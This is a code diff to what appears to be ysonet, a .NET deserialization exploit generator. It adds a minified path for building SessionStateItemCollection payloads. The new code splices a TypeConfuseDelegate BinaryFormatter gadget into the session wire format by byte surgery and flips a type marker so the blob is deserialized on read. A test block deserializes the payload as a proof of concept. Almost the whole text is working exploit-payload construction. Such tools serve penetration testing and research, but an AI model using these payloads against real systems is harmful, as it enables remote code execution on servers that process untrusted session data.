@@ -89,39 +89,51 @@ namespace ysonet.Plugins
 
             if (mode.ToLower().Equals("sessionstateitemcollection"))
             {
-                /* I decided to change the TypeConfuseDelegateGenerator class and use its gadget instead of doing this through the following hacky way */
-
-                /* hacky way begin
-                byte[] tempPayload_init = (byte[])new TypeConfuseDelegateGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
-                byte[] tempPayload = new byte[tempPayload_init.Length + 1]; // adding one byte initially to fix the length problem
-                tempPayload_init.CopyTo(tempPayload, 0);
-                System.Web.SessionState.SessionStateItemCollection items = new System.Web.SessionState.SessionStateItemCollection();
-                items[""] = tempPayload;
-                MemoryStream stream = new MemoryStream();
-                BinaryWriter writer = new BinaryWriter(stream);
-                items.Serialize(writer);
-                stream.Flush();
-                tempPayload = stream.ToArray();
-                byte[] newSerializedData = new byte[tempPayload.Length-27-1-1]; // yes don't ask about the numbers! it's magical!
-                Array.Copy(tempPayload, 0, newSerializedData, 0, 9); // reading first 9 bytes
-                Array.Copy(tempPayload, 36, newSerializedData, 9, tempPayload.Length-27-1-9-1); // ignoring 27 bytes after 9 bytes + reading the rest + ignoring the last byte
-                newSerializedData[13] = 20; // for ReadByte - 20 is the type that will be deserialized in AltSerialization.ReadValueFromStream
-                // hacky way ends */
-
-                /* here it is using the sane way! */
-                object serializedData = (object)TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);
-                System.Web.SessionState.SessionStateItemCollection items = new System.Web.SessionState.SessionStateItemCollection();
-                items[""] = serializedData;
-                MemoryStream stream = new MemoryStream();
-                BinaryWriter writer = new BinaryWriter(stream);
-                items.Serialize(writer);
-                stream.Flush();
-                payload = stream.ToArray();
+                if (inputArgs.Minify)
+                {
+                    // Minified path. The default path below hands the gadget OBJECT to System.Web,
+                    // whose SessionStateItemCollection.Serialize uses the stock BinaryFormatter and
+                    // therefore ignores --minify. To honor it, take the minified BinaryFormatter blob
+                    // directly and splice it into the SessionStateItemCollection wire format: store the
+                    // blob as a byte[] value (its raw bytes go in verbatim), then flip the value's type
+                    // marker to 20 so AltSerialization.ReadValueFromStream BF-deserializes those bytes
+                    // on read, reaching the same gadget as the object path. The framing offsets are
+                    // fixed by the empty key and the byte[] header (independent of the blob length), so
+                    // the magic numbers hold for any blob. GenerateWithNoTest honors inputArgs.Minify.
+                    byte[] bfBytes = (byte[])new TypeConfuseDelegateGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
+                    byte[] tempPayload = new byte[bfBytes.Length + 1]; // one trailing byte fixes the length
+                    bfBytes.CopyTo(tempPayload, 0);
+                    System.Web.SessionState.SessionStateItemCollection items = new System.Web.SessionState.SessionStateItemCollection();
+                    items[""] = tempPayload;
+                    MemoryStream stream = new MemoryStream();
+                    BinaryWriter writer = new BinaryWriter(stream);
+                    items.Serialize(writer);
+                    stream.Flush();
+                    tempPayload = stream.ToArray();
+                    byte[] newSerializedData = new byte[tempPayload.Length - 27 - 1 - 1];
+                    Array.Copy(tempPayload, 0, newSerializedData, 0, 9); // first 9 bytes: collection header
+                    Array.Copy(tempPayload, 36, newSerializedData, 9, tempPayload.Length - 27 - 1 - 9 - 1); // skip 27 bytes of byte[] framing, copy the blob, drop the trailing byte
+                    newSerializedData[13] = 20; // value type 20 -> ReadValueFromStream BF-deserializes the blob
+                    payload = newSerializedData;
+                }
+                else
+                {
+                    // Default path: hand the gadget OBJECT to System.Web and let it serialize with the
+                    // stock BinaryFormatter. Clean, but cannot honor --minify (hence the branch above).
+                    object serializedData = (object)TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);
+                    System.Web.SessionState.SessionStateItemCollection items = new System.Web.SessionState.SessionStateItemCollection();
+                    items[""] = serializedData;
+                    MemoryStream stream = new MemoryStream();
+                    BinaryWriter writer = new BinaryWriter(stream);
+                    items.Serialize(writer);
+                    stream.Flush();
+                    payload = stream.ToArray();
+                }
 
                 if (test)
                 {
                     // PoC on how it works in practice
-                    stream = new MemoryStream((byte[])payload);
+                    MemoryStream stream = new MemoryStream((byte[])payload);
                     BinaryReader binReader = new BinaryReader(stream);
                     System.Web.SessionState.SessionStateItemCollection test = System.Web.SessionState.SessionStateItemCollection.Deserialize(binReader);
                     test.GetEnumerator();
